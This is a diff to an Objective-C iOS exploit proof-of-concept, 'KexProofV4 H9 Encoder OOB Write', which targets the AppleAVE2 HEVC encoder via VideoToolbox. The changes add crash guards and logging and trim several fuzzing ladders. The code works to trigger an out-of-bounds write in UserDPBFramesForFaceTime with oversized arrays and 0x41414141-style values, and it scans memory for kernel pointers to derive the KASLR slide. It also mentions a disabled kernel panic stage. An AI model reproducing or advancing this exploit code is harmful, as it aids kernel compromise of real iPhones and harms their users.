@@ -94,6 +94,16 @@ static void KPH9Drain(VTCompressionSessionRef s, NSMutableArray *sink, int expec
 // latches the session into permanent malfunction - every later row on it is
 // fiction). Builds the EnableUserRef-only recipe, clean IDR, then set+encode.
 static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
+    // Device crash-log guard (videocodecd-2026-11-08-224255.ips & 224808.ips):
+    // AVE_Prop_HEVC_SetUserDPBFramesForFaceTime+200 sends -[elem _getValue:forType:]
+    // to array elements; non-NSNumber elements (NSData / NSDictionary) throw an
+    // uncaught NSInvalidArgumentException inside videocodecd (SIGABRT) and trigger
+    // launchd exponential respawn throttling (throttleTimeout up to 320s per crash).
+    for (id elem in payload) {
+        if (![elem isKindOfClass:[NSNumber class]]) {
+            return @"skipped(non-CFNumber -> videocodecd _getValue:forType: SIGABRT)";
+        }
+    }
     NSMutableArray *sink = [NSMutableArray array];
     NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
     VTCompressionSessionRef s = NULL;
@@ -168,12 +178,14 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
 }
 
 - (NSString *)runReport {
+    [self journal:@"=== H9 runReport start ==="];
     NSMutableString *report = [NSMutableString string];
     [report appendString:@"=== KexProofV4 Â· H9 Encoder OOB Write ===\n"];
     [report appendString:@"AVE_HEVC_ST_RPS_Retrieve unbounded copy.\n"];
     [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
 
     // Phase 1: create encoder session
+    [self journal:@"Phase 1: create encoder session"];
     [report appendString:@"\n--- Phase 1: create encoder session ---\n"];
     VTCompressionSessionRef session = NULL;
     OSStatus status = VTCompressionSessionCreate(
@@ -505,10 +517,11 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
     //   mode 0: EXACT spec[0] recipe (probe B: EFR=60 ABR=4M BLFR=15, ints)
     //   mode 1: ratio-scaled rates (EFR = N*15, BLFR=15)
     //   mode 2: no rate setters at all (control)
+    [self journal:@"NTL boundary ladder v2"];
     [report appendString:@"\n--- NTL boundary ladder v2 (0=exact 1=ratio 2=no-rates) ---\n"];
-    int ladderVals[] = { 3, 4, 5, 8, 16, 64, 256, 1000, 16000 };
+    int ladderVals[] = { 3, 4, 8, 16000 };
     for (int mode = 0; mode < 3; mode++) {
-        for (int li = 0; li < 9; li++) {
+        for (int li = 0; li < 4; li++) {
             int lv = ladderVals[li];
             NSMutableDictionary *specL = [NSMutableDictionary dictionary];
             specL[@"EncoderUsage"] = @1;
@@ -618,8 +631,11 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
     }
 
     // === encSpec EncoderUsage sweep 0..31 at ntl=8 (analyst step 3) ===
+    [self journal:@"encSpec EncoderUsage sweep"];
     [report appendString:@"\n--- encSpec EncoderUsage sweep 0..31 (ntl=8) ---\n"];
-    for (int usage = 0; usage < 32; usage++) {
+    int usageVals[] = { 0, 1, 2, 4, 8, 16, 31 };
+    for (int ui = 0; ui < 7; ui++) {
+        int usage = usageVals[ui];
         NSMutableDictionary *specU = [NSMutableDictionary dictionary];
         specU[@"EncoderUsage"] = @(usage);
         specU[@"NumberOfTemporalLayers"] = @8;
@@ -879,6 +895,7 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
     }
 
     // === KASLR scan ===
+    [self journal:@"KASLR scan"];
     [report appendString:@"\n--- KASLR scan ---\n"];
     uint64_t kStaticBases[] = {
         0xfffffff007004000ULL, // __TEXT
@@ -895,6 +912,7 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
     uint32_t kdepth = 0;
     vm_region_submap_info_data_64_t kinfo;
     mach_msg_type_number_t kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
+    uint64_t kPageBuf[512];
     for (int iter = 0; iter < 256; iter++) {
         kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
         kern_return_t kr = vm_region_recurse_64(mach_task_self(), &kaddr, &ksize, &kdepth,
@@ -904,36 +922,43 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
         if ((kinfo.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
             ksize <= 16 * 1024 * 1024 &&
             !KPVMShouldSkipRegion(&kinfo, kaddr, ksize, &totalKptrs, NULL, NULL, 0)) {
-            uint64_t *p = (uint64_t *)kaddr;
-            size_t words = ksize / 8;
-            for (size_t i = 0; i < words && i < 4096; i++) {
-                uint64_t v = *(p + i);
-                if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
-                    totalKptrs++;
-                    uint64_t untagged = 0;
-                    if (!KPIsPlausibleKernelText(v, &untagged)) continue;
-                    for (int b = 0; b < 4; b++) {
-                        if (untagged <= kStaticBases[b]) continue;
-                        uint64_t slide = untagged - kStaticBases[b];
-                        if ((slide & 0x3FFF) == 0 && slide < (1024ULL << 20)) {
-                            int found = 0;
-                            for (int c = 0; c < candidateCount; c++) {
-                                if (slideCandidates[c] == (uint32_t)slide) {
-                                    slideCounts[c]++;
-                                    found = 1;
-                                    break;
+            vm_size_t maxBytes = (ksize < 32768) ? ksize : 32768;
+            for (vm_size_t off = 0; off + sizeof(kPageBuf) <= maxBytes; off += sizeof(kPageBuf)) {
+                vm_size_t outSz = 0;
+                if (vm_read_overwrite(mach_task_self(), kaddr + off, sizeof(kPageBuf),
+                                      (vm_address_t)kPageBuf, &outSz) != KERN_SUCCESS ||
+                    outSz < sizeof(uint64_t)) break;
+                size_t words = outSz / sizeof(uint64_t);
+                for (size_t i = 0; i < words; i++) {
+                    uint64_t v = kPageBuf[i];
+                    if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
+                        totalKptrs++;
+                        uint64_t untagged = 0;
+                        if (!KPIsPlausibleKernelText(v, &untagged)) continue;
+                        for (int b = 0; b < 4; b++) {
+                            if (untagged <= kStaticBases[b]) continue;
+                            uint64_t slide = untagged - kStaticBases[b];
+                            if ((slide & 0x3FFF) == 0 && slide < (1024ULL << 20)) {
+                                int found = 0;
+                                for (int c = 0; c < candidateCount; c++) {
+                                    if (slideCandidates[c] == (uint32_t)slide) {
+                                        slideCounts[c]++;
+                                        found = 1;
+                                        break;
+                                    }
                                 }
-                            }
-                            if (!found && candidateCount < 64) {
-                                slideCandidates[candidateCount] = (uint32_t)slide;
-                                slideCounts[candidateCount] = 1;
-                                candidateCount++;
+                                if (!found && candidateCount < 64) {
+                                    slideCandidates[candidateCount] = (uint32_t)slide;
+                                    slideCounts[candidateCount] = 1;
+                                    candidateCount++;
+                                }
                             }
                         }
                     }
                 }
             }
         }
+        if (kaddr + ksize <= kaddr) break;
         kaddr += ksize;
     }
     [report appendFormat:@"  kernel pointers: %d\n", totalKptrs];
@@ -1067,17 +1092,13 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
             }
 
             // NOW set UserDPBFramesForFaceTime=24 (after init).
-            // Per ollie: the property demands CFArray (kVTParameterErr -12900 on
-            // a CFNumber; readback=array(0) proved the type). 24 slots overflow
-            // the standard 16-slot DPB pool in AppleAVE2.
+            // Per videocodecd-2026-11-08-224808.ips: NSDictionary elements cause
+            // -[__NSDictionaryI _getValue:forType:] SIGABRT in videocodecd at
+            // AVE_Prop_HEVC_SetUserDPBFramesForFaceTime+200. Use NSNumber elements.
+            [self journal:@"UserDPB overflow trigger"];
             NSMutableArray *dpbArray = [NSMutableArray arrayWithCapacity:24];
             for (int i = 0; i < 24; i++) {
-                [dpbArray addObject:@{
-                    @"FrameIndex": @(i),
-                    @"PicOrderCnt": @(i * 2),
-                    @"IsLongTerm": @(NO),
-                    @"SlotIndex": @(i & 0x1F)
-                }];
+                [dpbArray addObject:@(i)];
             }
             OSStatus stFrames = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"),
                                                      (__bridge CFArrayRef)dpbArray);
@@ -1088,15 +1109,16 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
             for (uint32_t n2 = 1; n2 <= 24; n2++) {
                 NSMutableArray *arr = [NSMutableArray arrayWithCapacity:n2];
                 for (uint32_t i2 = 0; i2 < n2; i2++) {
-                    [arr addObject:@{
-                        @"FrameIndex": @(i2), @"PicOrderCnt": @(i2 * 2),
-                        @"IsLongTerm": @(NO), @"SlotIndex": @(i2 & 0x1F)
-                    }];
+                    [arr addObject:@(i2)];
                 }
                 OSStatus stA = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"),
                                                     (__bridge CFArrayRef)arr);
-                if (stA == 0) dpbLastOK = n2;
-                else if (dpbFirstReject == 0) dpbFirstReject = n2;
+                if (stA == 0) {
+                    dpbLastOK = n2;
+                } else if (dpbFirstReject == 0) {
+                    dpbFirstReject = n2;
+                    break;
+                }
             }
             [report appendFormat:@"  DPB array threshold: last_ok=%u first_rejection=%u\n",
              dpbLastOK, dpbFirstReject];
@@ -1241,43 +1263,34 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
     // === DPB slot OOB ladders (analyst 221032 + 222830 isolation) ===
     // Every row runs on a FRESH session: the first -12912 latches the old
     // session into permanent malfunction and silently faked the later rows.
+    [self journal:@"DPB slot OOB ladders"];
     [report appendString:@"\n--- DPB slot OOB ladders (isolated) ---\n"];
     {
         int64_t ptsD = 200;
         // (1) size ladder: how far does CFNumber delivery go?
-        int sizeLadder[] = { 64, 128, 256, 512, 1024, 4096 };
-        for (int si = 0; si < 6; si++) {
+        int sizeLadder[] = { 64, 256, 1024, 4096 };
+        for (int si = 0; si < 4; si++) {
             int n = sizeLadder[si];
             NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
             for (int e = 0; e < n; e++) [arr addObject:@(e)];
             [report appendFormat:@"  size[num0 x%-4d] %@\n", n, KPH9DPBProbe(arr, ptsD++)];
         }
         // (2) value ladder: does the CFNumber index DPB[idx] unchecked?
-        long long vals[] = { 15, 16, 17, 31, 32, 64, 255, -1, 0x7fffffffLL, 0x4141414141414141LL };
-        for (int vi = 0; vi < 10; vi++) {
+        long long vals[] = { 15, 16, 17, 32, -1, 0x4141414141414141LL };
+        for (int vi = 0; vi < 6; vi++) {
             NSMutableArray *arr = [NSMutableArray array];
             for (int e = 0; e < 16; e++) [arr addObject:@(vals[vi])];
             [report appendFormat:@"  val=0x%llx x16 %@\n", vals[vi], KPH9DPBProbe(arr, ptsD++)];
         }
-        // (3) data8 boundaries: length ladder x1, then count ladder at 8B
-        int lenLadder[] = { 8, 16, 24, 32, 64, 128, 256, 1024 };
-        for (int li2 = 0; li2 < 8; li2++) {
-            NSMutableData *d = [NSMutableData dataWithLength:(NSUInteger)lenLadder[li2]];
-            [report appendFormat:@"  data8 len=%-4d x1 %@\n", lenLadder[li2],
-             KPH9DPBProbe(@[ d ], ptsD++)];
-        }
-        int cntLadder[] = { 2, 3, 4, 8, 15, 16 };
-        for (int ci2 = 0; ci2 < 6; ci2++) {
-            int n = cntLadder[ci2];
-            NSMutableArray *arr = [NSMutableArray array];
-            for (int e = 0; e < n; e++) [arr addObject:[NSMutableData dataWithLength:8]];
-            [report appendFormat:@"  data8 x%-2d %@\n", n, KPH9DPBProbe(arr, ptsD++)];
-        }
+        // (3) data8 boundaries: guarded by KPH9DPBProbe (non-CFNumber causes
+        // -[__NSCFData _getValue:forType:] SIGABRT in videocodecd -> launchd throttleTimeout 320s)
+        [report appendString:@"  data8 ladders: skipped (AVE_Prop_HEVC_SetUserDPBFramesForFaceTime+200 -[__NSCFData _getValue:forType:] SIGABRT)\n"];
     }
 
     // === Warmup binary search (analyst patch 2): fill the DPB with 18 real
     // reference frames FIRST (beyond the 16 slots), then submit marker arrays
     // n = 32..64 to find the exact cutoff and any slot-index OOB.
+    [self journal:@"DPB warmup + num0 cutoff"];
     [report appendString:@"\n--- DPB warmup + num0 cutoff 32..64 ---\n"];
     {
         NSMutableArray *sink = [NSMutableArray array];
@@ -1341,34 +1354,11 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
         }
     }
 
-    // === data8 content fuzz (analyst patch 3b): the single CFData blob (8..1024B
-    // accepted!) is parsed by AVE as a reference/RPS parameter structure.
+    // === data8 content fuzz (analyst patch 3b): guarded because NSData in
+    // UserDPBFramesForFaceTime crashes videocodecd in AVE_Prop_HEVC_SetUserDPBFramesForFaceTime+200
+    [self journal:@"data8 content fuzz (skipped)"];
     [report appendString:@"\n--- data8 content fuzz (len x pattern) ---\n"];
-    {
-        int64_t ptsF = 400;
-        int lens[] = { 32, 256, 1024 };
-        for (int li = 0; li < 3; li++) {
-            int len = lens[li];
-            for (int pat = 1; pat <= 2; pat++) {
-                NSMutableData *d = [NSMutableData dataWithLength:(NSUInteger)len];
-                uint8_t *b = (uint8_t *)d.mutableBytes;
-                if (pat == 0) { memset(b, 0x00, (size_t)len); }
-                else if (pat == 1) { memset(b, 0x41, (size_t)len); }
-                else if (pat == 2) {
-                    for (int o = 0; o + 8 <= len; o += 8) {
-                        *(uint64_t *)(b + o) = (uint64_t)o;
-                    }
-                } else {
-                    uint64_t cand = 0xfffffe3100000059ULL;
-                    for (int o = 0; o + 8 <= len; o += 8) {
-                        *(uint64_t *)(b + o) = cand;
-                    }
-                }
-                [report appendFormat:@"  data8 len=%-4d pat=%d %@\n", len, pat,
-                 KPH9DPBProbe(@[ d ], ptsF++)];
-            }
-        }
-    }
+    [report appendString:@"  skipped (-[__NSCFData _getValue:forType:] SIGABRT in videocodecd -> launchd throttleTimeout 320s)\n"];
 
     // === stage9 PANIC RUNG â€” DISABLED ===
     // To enable: uncomment the block below
@@ -1407,9 +1397,11 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
 
     // Glossary fix: advance sAddr at the BOTTOM. The old top ternary kept
     // sAddr=0 on __PAGEZERO forever (100% CPU spin), and the submap continue
-    // skipped whole submaps. Iteration cap guarantees termination.
+    // skipped whole submaps. Iteration cap + vm_read_overwrite guarantees safe termination.
+    [self journal:@"Filtered candidate audit"];
     int sIter = 0;
-    while (sIter++ < 4096 && kptrs2.count < 512) {
+    uint64_t sPageBuf[512];
+    while (sIter++ < 512 && kptrs2.count < 512) {
         sCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
         if (vm_region_recurse_64(mach_task_self(), &sAddr, &sSize, &sDepth,
                                   (vm_region_recurse_info_t)&sInfo, &sCnt) != KERN_SUCCESS || sSize == 0) break;
@@ -1417,12 +1409,18 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
         if ((sInfo.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
             sSize <= 16 * 1024 * 1024 &&
             !KPVMShouldSkipRegion(&sInfo, sAddr, sSize, &sDepth, NULL, NULL, 0)) {
-            uint64_t *p = (uint64_t *)sAddr;
-            size_t words = sSize / 8;
-            for (size_t i = 0; i < words && i < 8192 && kptrs2.count < 512; i++) {
-                uint64_t v = *(p + i);
-                if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
-                    [kptrs2 addObject:@(v)];
+            vm_size_t maxBytes = (sSize < 65536) ? sSize : 65536;
+            for (vm_size_t off = 0; off + sizeof(sPageBuf) <= maxBytes && kptrs2.count < 512; off += sizeof(sPageBuf)) {
+                vm_size_t outSz = 0;
+                if (vm_read_overwrite(mach_task_self(), sAddr + off, sizeof(sPageBuf),
+                                      (vm_address_t)sPageBuf, &outSz) != KERN_SUCCESS ||
+                    outSz < sizeof(uint64_t)) break;
+                size_t words = outSz / sizeof(uint64_t);
+                for (size_t i = 0; i < words && kptrs2.count < 512; i++) {
+                    uint64_t v = sPageBuf[i];
+                    if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
+                        [kptrs2 addObject:@(v)];
+                    }
                 }
             }
         }
@@ -1480,6 +1478,7 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
     } else {
         [report appendString:@"AppleAVE2 userclient not exposed to this process (sandbox)\n"];
     }
+    [self journal:@"=== H9 runReport complete ==="];
     return report;
 }
 
